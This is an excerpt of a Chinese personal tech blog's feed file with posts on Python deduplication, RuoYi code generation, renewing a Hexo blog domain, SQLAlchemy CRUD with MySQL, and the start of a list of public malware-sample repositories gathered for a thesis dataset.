'd']</span></span><br></pre></td></tr></table></figure><p>当然，它会比单纯用集合进行去重的方式耗时稍微久一点；<code>dict.fromkeys()</code>仅在Python3.6及以上才支持。</p><hr><p>在Python3.6以下，其实也存在fromkeys函数，只不过它由collections提供：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line">item_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>]</span><br><span class="line">unique = list(OrderedDict.fromkeys(item_list))</span><br><span class="line">print(unique)  <span class="comment"># ['a', 'b', 'c', 'd']</span></span><br></pre></td></tr></table></figure><p>比 Python3.6 的内置<code>dict.fromkeys()</code>慢一些，这是因为<code>OrderedDict</code>是用纯Python实现的。</p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【开源代码学习--若依】代码自动生成</title>
      <link href="/2022/03/04/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91%E4%BB%A3%E7%A0%81%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90/"/>
      <url>/2022/03/04/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91%E4%BB%A3%E7%A0%81%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-创建数据表"><a class="markdownIt-Anchor" href="#1-创建数据表"></a> 1 创建数据表</h1><h1 id="2-使用若依进行代码生成"><a class="markdownIt-Anchor" href="#2-使用若依进行代码生成"></a> 2 使用若依进行代码生成</h1><h1 id="3-打通前后端"><a class="markdownIt-Anchor" href="#3-打通前后端"></a> 3 打通前后端</h1><h2 id="31-controller"><a class="markdownIt-Anchor" href="#31-controller"></a> 3.1 controller</h2><p>MalwareDynamicController.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据mid查询malware_dynamic列表</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@PreAuthorize</span>(<span class="string">"@ss.hasPermi('system:dynamic:listmid')"</span>)</span><br><span class="line"><span class="meta">@GetMapping</span>(value = <span class="string">"/list/&#123;mid&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> TableDataInfo <span class="title">listByMid</span><span class="params">(MalwareDynamic malwareDynamic, @PathVariable(<span class="string">"mid"</span>)</span> Long mid)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    startPage();</span><br><span class="line">    List&lt;MalwareDynamic&gt; list = malwareDynamicService.selectMalwareDynamicListByMid(malwareDynamic, mid);</span><br><span class="line">    <span class="keyword">return</span> getDataTable(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="32-service"><a class="markdownIt-Anchor" href="#32-service"></a> 3.2 service</h2><p>IMalwareDynamicService.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询malware_dynamic列表</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> malwareDynamic malware_dynamic</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> malware_dynamic集合</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;MalwareDynamic&gt; <span class="title">selectMalwareDynamicListByMid</span><span class="params">(MalwareDynamic malwareDynamic, Long mid)</span></span>;</span><br></pre></td></tr></table></figure><p>MalwareDynamicServiceImpl.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据mid查询malware_dynamic列表</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> malwareDynamic malware_dynamic</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> malware_dynamic</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;MalwareDynamic&gt; <span class="title">selectMalwareDynamicListByMid</span><span class="params">(MalwareDynamic malwareDynamic, Long mid)</span></span>;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> malwareDynamicMapper.selectMalwareDynamicListByMid(malwareDynamic, mid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="33-mapper"><a class="markdownIt-Anchor" href="#33-mapper"></a> 3.3 mapper</h2><p>MalwareDynamicMapper.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查询malware_dynamic列表</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> behavior behavior</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> behavior集合</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Behavior&gt; <span class="title">selectBehaviorList</span><span class="params">(Behavior behavior)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="34-malwaredynamicmapperxml"><a class="markdownIt-Anchor" href="#34-malwaredynamicmapperxml"></a> 3.4 MalwareDynamicMapper.xml</h2><p>MalwareDynamicMapper.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="35-indexvue"><a class="markdownIt-Anchor" href="#35-indexvue"></a> 3.5 index.vue</h2><h2 id="36-reportjs"><a class="markdownIt-Anchor" href="#36-reportjs"></a> 3.6 report.js</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">srcu/exec/exec.c: In function ‘exec_wrapper’:</span><br><span class="line">srcu/exec/exec.c:<span class="number">238</span>:<span class="number">3</span>: error: ‘<span class="built_in">strcat</span>’ accessing <span class="number">81</span> <span class="keyword">or</span> more bytes at offsets <span class="number">264</span> <span class="keyword">and</span> <span class="number">184</span> may overlap <span class="number">1</span> byte at offset <span class="number">264</span> [-Werror=<span class="keyword">restrict</span>]</span><br><span class="line">   <span class="built_in">strcat</span>(decoding.asm_buf, decoding.assembly);</span><br></pre></td></tr></table></figure><h1 id="4-无效"><a class="markdownIt-Anchor" href="#4-无效"></a> 4 无效</h1><p>有时候出现<code>接口404</code>，此时需要关闭IDEA，然后重新打开后端项目</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客域名</title>
      <link href="/2022/03/01/Hexo%E5%8D%9A%E5%AE%A2%E5%9F%9F%E5%90%8D/"/>
      <url>/2022/03/01/Hexo%E5%8D%9A%E5%AE%A2%E5%9F%9F%E5%90%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题引入"><a class="markdownIt-Anchor" href="#1-问题引入"></a> 1 问题引入</h1><p>今天访问博客失败，原因是之前在<a href="https://www.freenom.com/zh/freeandpaiddomains.html" target="_blank" rel="noopener">Freenom</a>上申请的域名<code>dragonliu.tk</code>已经过期。登陆再次申请时，发现已付费：</p><img src="https://s2.loli.net/2022/03/01/nCtPu82NslyU4pX.png" width="700" height="400" alt="图片名称" align="center" id="99"><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><h2 id="21-使用github默认的域名"><a class="markdownIt-Anchor" href="#21-使用github默认的域名"></a> 2.1 使用github默认的域名</h2><p>将<code>source</code>目录下的<code>CNAME</code>删掉，然后重新提交博客即可<code>hexo g -d</code>，然后访问https://dragonliu2018.github.io/。</p><img src="https://s2.loli.net/2022/03/01/ftXbFJzoDOeYAMy.png" width="800" height="400" alt="图片名称" align="center" id="100"><h2 id="22-重新申请其他域名"><a class="markdownIt-Anchor" href="#22-重新申请其他域名"></a> 2.2 重新申请其他域名</h2><ol><li><p>申请到一个新域名<code>dragonliu.gq</code>（吐槽：这个网站需要翻墙，访问速度慢，而且老是自动登出，订单容易提交失败，域名到期无提醒。）此时这个域名还Ping不通：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\01 Blog_work\Hexo-Blog&gt;ping dragonliu.gq</span><br><span class="line">Ping 请求找不到主机 dragonliu.gq。请检查该名称，然后重试。</span><br></pre></td></tr></table></figure></li><li><p>在Freenom上配置Domain：</p><img src="https://s2.loli.net/2022/03/01/XbWzqHvLkjuRxFl.png" width="600" height="300" alt="图片名称" align="center" id="103"><img src="https://s2.loli.net/2022/03/01/k4yW6ULHx7MoTAi.png" width="600" height="200" alt="图片名称" align="center" id="102"><p>这里填入github博客默认域名：</p><img src="https://s2.loli.net/2022/03/01/juDLbsxv4TKzXlp.png" width="600" height="300" alt="图片名称" align="center" id="104"></li></ol><p>​等待几分钟后可以Ping通：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">E:\01 Blog_work\Hexo-Blog&gt;ping dragonliu.gq</span><br><span class="line"></span><br><span class="line">正在 Ping dragonliu.gq [185.199.108.153] 具有 32 字节的数据:</span><br><span class="line">来自 185.199.108.153 的回复: 字节=32 时间=58ms TTL=53</span><br><span class="line">来自 185.199.108.153 的回复: 字节=32 时间=74ms TTL=53</span><br><span class="line">来自 185.199.108.153 的回复: 字节=32 时间=74ms TTL=53</span><br><span class="line">来自 185.199.108.153 的回复: 字节=32 时间=58ms TTL=53</span><br><span class="line"></span><br><span class="line">185.199.108.153 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = 58ms，最长 = 74ms，平均 = 66ms</span><br></pre></td></tr></table></figure><ol start="4"><li><p>在<code>source</code>目录下的<code>CNAME</code>文件改为对应新域名：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dragonliu.gq</span><br></pre></td></tr></table></figure></li><li><p>然后重新提交博客即可<code>hexo g -d</code>，就可以访问新域名了 <code>dragonliu.gq</code></p></li></ol><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://segmentfault.com/a/1190000021979631" target="_blank" rel="noopener">超级详细Hexo+GitHub+阿里云域名的博客搭建教程，新手也能轻松学会</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-Mysql-通过SQLAlchemy操作</title>
      <link href="/2022/03/01/Python-Mysql-%E9%80%9A%E8%BF%87SQLAlchemy%E6%93%8D%E4%BD%9C/"/>
      <url>/2022/03/01/Python-Mysql-%E9%80%9A%E8%BF%87SQLAlchemy%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>Windows下安装Mysql参考：<a href="http://dragonliu.tk/2022/02/15/Windows%E4%B8%8B%E5%AE%89%E8%A3%85MySQL/" target="_blank" rel="noopener">博客——Windows下安装MySQL</a></p><p>SQLAlchemy是用Python编程语言开发的一个开源项目。它提供了SQL工具包和ORM（对象关系映射）工具，使用MIT许可证发行。</p><h1 id="2-安装"><a class="markdownIt-Anchor" href="#2-安装"></a> 2 安装</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install sqlalchemy</span><br><span class="line">pip3 install pymysql</span><br></pre></td></tr></table></figure><p>本文使用MySQL作为数据库，使用pymysql作为驱动，因此需要安装pymysql。</p><h1 id="3-简单使用"><a class="markdownIt-Anchor" href="#3-简单使用"></a> 3 简单使用</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy.ext.declarative <span class="keyword">import</span> declarative_base</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine, Column, Integer, String, TEXT</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> sessionmaker</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> or_</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="number">3306</span></span><br><span class="line">USERNAME = <span class="string">'xxx'</span>  <span class="comment"># mysql用户名</span></span><br><span class="line">PASSWORD = <span class="string">'xxx'</span>  <span class="comment"># mysql密码</span></span><br><span class="line">DB = <span class="string">'xxx'</span>  <span class="comment"># 数据库名称</span></span><br><span class="line"><span class="comment"># f代表可以使用&#123;&#125;引用变量</span></span><br><span class="line">DB_URI = <span class="string">f'mysql+pymysql://<span class="subst">&#123;USERNAME&#125;</span>:<span class="subst">&#123;PASSWORD&#125;</span>@<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/<span class="subst">&#123;DB&#125;</span>'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建引擎</span></span><br><span class="line">engine = create_engine(DB_URI)</span><br><span class="line"><span class="comment"># 创建SQLORM基类，注意这里要加参数，参数为上一步创建的引擎</span></span><br><span class="line">Base = declarative_base(engine)</span><br><span class="line"><span class="comment"># 构建session对象</span></span><br><span class="line">session = sessionmaker(engine)()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建实体表Person</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(Base)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'person'</span>  <span class="comment"># 表名</span></span><br><span class="line">    id = Column(Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = Column(String(<span class="number">100</span>))</span><br><span class="line">    value = Column(TEXT())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将模型映射到数据库中</span></span><br><span class="line"><span class="comment"># 即如果数据库中没有student表则创建映射表student</span></span><br><span class="line">Base.metadata.create_all()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增：一个</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(obj)</span>:</span></span><br><span class="line">    session.add(obj)  <span class="comment"># 添加到session</span></span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增：批量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_batch</span><span class="params">(obj_list)</span>:</span></span><br><span class="line">    session.add_all(obj_list)</span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    session.query(Person).filter(Person.name == <span class="string">'Pig'</span>).delete()</span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 改</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 将查找到的对象全部修改</span></span><br><span class="line">    session.query(Person).filter(Person.name == <span class="string">'dragon'</span>).update(&#123;<span class="string">'value'</span>: <span class="string">'waiting'</span>&#125;)</span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查：所有数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_all</span><span class="params">()</span>:</span></span><br><span class="line">    item_list = session.query(Person).all()</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> item_list:</span><br><span class="line">        print(item.name, item.value)</span><br><span class="line">    <span class="comment"># 若没有此句，后面执行删除表时会卡住</span></span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查：指定列查询</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_in_cols</span><span class="params">()</span>:</span></span><br><span class="line">    item_list = session.query(Person.name).all()</span><br><span class="line">    print(item_list)</span><br><span class="line">    <span class="comment"># 若没有此句，后面执行删除表时会卡住</span></span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查：获取返回数据的第一行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_first_row</span><span class="params">()</span>:</span></span><br><span class="line">    item = session.query(Person.name).first()</span><br><span class="line">    print(item)</span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查：使用filter()方法过滤</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_filter</span><span class="params">()</span>:</span></span><br><span class="line">    item_list = session.query(Person.name).filter(Person.value != <span class="string">"love"</span>).all()</span><br><span class="line">    print(item_list)</span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查：使用order_by()进行排序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_order</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 默认正序</span></span><br><span class="line">    item_list = session.query(Person.name, Person.value).order_by(Person.name).all()</span><br><span class="line">    print(item_list)</span><br><span class="line">    <span class="comment"># desc()倒序</span></span><br><span class="line">    item_list = session.query(Person.name, Person.value).order_by(Person.name.desc()).all()</span><br><span class="line">    print(item_list)</span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查：多条件查询</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_multi_condition</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 多条件查询条件以,分隔默认为and</span></span><br><span class="line">    item_list = session.query(Person.name).filter(Person.name != <span class="string">"dragon"</span>, Person.value != <span class="string">"love"</span>).all()</span><br><span class="line">    print(item_list)</span><br><span class="line">    <span class="comment"># 使用or_连接多个条件</span></span><br><span class="line">    item_list = session.query(Person.name).filter(or_(Person.name != <span class="string">"dragon"</span>, Person.value != <span class="string">"love"</span>)).all()</span><br><span class="line">    print(item_list)</span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查：模糊查询</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_like</span><span class="params">()</span>:</span></span><br><span class="line">    item_list = session.query(Person.name).filter(Person.name.like(<span class="string">'%ag%'</span>)).all()</span><br><span class="line">    print(item_list)</span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查：是否包含传递参数列表类元素</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_in</span><span class="params">()</span>:</span></span><br><span class="line">    item_list = session.query(Person.name).filter(Person.name.in_([<span class="string">"SY"</span>, <span class="string">"dragon"</span>])).all()</span><br><span class="line">    print(item_list)</span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查：计算个数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_count</span><span class="params">()</span>:</span></span><br><span class="line">    num = session.query(Person).count()</span><br><span class="line">    print(num)</span><br><span class="line">    session.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除TestTable表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_table</span><span class="params">()</span>:</span></span><br><span class="line">    Person.__table__.drop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    insert(Person(name=<span class="string">"SY"</span>, value=<span class="string">"afascinatinggril"</span>))</span><br><span class="line">    obj_list = [Person(name=<span class="string">"dragon"</span>, value=<span class="string">"aunreasoningboy"</span>),</span><br><span class="line">                Person(name=<span class="string">"pig"</span>, value=<span class="string">"aquerulousboy"</span>),</span><br><span class="line">                ]</span><br><span class="line">    insert_batch(obj_list)</span><br><span class="line">    delete()</span><br><span class="line">    update()</span><br><span class="line">    select_all()</span><br><span class="line">    select_in_cols()</span><br><span class="line">    select_first_row()</span><br><span class="line">    select_filter()</span><br><span class="line">    select_order()</span><br><span class="line">    select_multi_condition()</span><br><span class="line">    select_like()</span><br><span class="line">    select_in()</span><br><span class="line">    select_count()</span><br><span class="line">    del_table()</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><ol><li>增删改查除了查询不设计修改操作，其他增删改都需要使用commit()方法提交事务</li><li>执行查询操作后，不执行<code>session.commit()</code>，直接执行删除表操作会卡住</li></ol><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><p><a href="https://www.cnblogs.com/minseo/p/15305003.html" target="_blank" rel="noopener">sqlalchemy的基本用法</a></p></li><li><p><a href="https://www.cnpython.com/qa/33649" target="_blank" rel="noopener">如何在SQLAlchemy中删除表？</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意样本收集</title>
      <link href="/2022/02/28/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E6%94%B6%E9%9B%86/"/>
      <url>/2022/02/28/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>最近开始做毕设开题报告，发现勒索病毒并没有公开可用的数据集，所以需要从开源网站上去搜集，下面对一些信息汇总。</p><h1 id="2-信息汇总"><a class="markdownIt-Anchor" href="#2-信息汇总"></a> 2 信息汇总</h1><table><thead><tr><th style="text-align:center">网站</th><th style="text-align:center">简介</th></tr></thead><tbody><tr><td style="text-align:center">ACT-KingKong数据集</td><td style="text-align:center">ACT实验室数据(21474条样本，2072个家族)</td></tr><tr><td style="text-align:center"><a href="https://paper.seebug.org/421/" target="_blank" rel="noopener">恶意软件分析大合集</a></td><td style="text-align:center">教程知识汇总</td></tr><tr><td style="text-align:center"><a href="https://malshare.com/" target="_blank" rel="noopener">MalShare</a></td><td style="text-align:center">Yara规则结果</td></tr><tr><td style="text-align:center"><a href="https://virusshare.com/" target="_blank" rel="noopener">VirusShare</a></td><td style="text-align:center">静态分析结果</td></tr><tr><td style="text-align:center"><a href="https://bazaar.abuse.ch/" target="_blank" rel="noopener">Malware bazaar</a></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">Exploit Database</a></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"><a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener">VirusTotal</a></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"><a href="https://www.jianshu.com/p/d46f62298cab" target="_blank" rel="noopener">MMCC微软恶意软件分类挑战数据集</a></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"><a 